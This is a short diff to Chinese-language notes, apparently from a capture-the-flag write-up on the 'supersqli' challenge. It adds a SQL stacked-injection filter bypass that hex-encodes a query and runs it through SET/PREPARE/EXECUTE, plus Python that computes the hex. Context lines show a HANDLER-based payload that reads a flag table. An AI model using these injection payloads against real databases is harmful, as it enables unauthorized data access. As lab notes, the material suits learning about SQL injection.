@@ -45,6 +45,19 @@ select group_concat(table_name) from mysql.innodb_table_stats
 
   * 利用set prepare
 
+    ```sql
+    @t=(sql 查询语句的hex值);prepare x from @t;execute x;#
+    ```
+
+    bypass进行堆叠注入
+
+    ```python
+    python
+    >>> import binascii
+    >>> binascii.b2a_hex("select * from supersqli.1919810931114514")
+    '73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134'
+    ```
+
   * 利用handler
 
   1';handler `FlagHere` open;handler `FlagHere` read first;\#
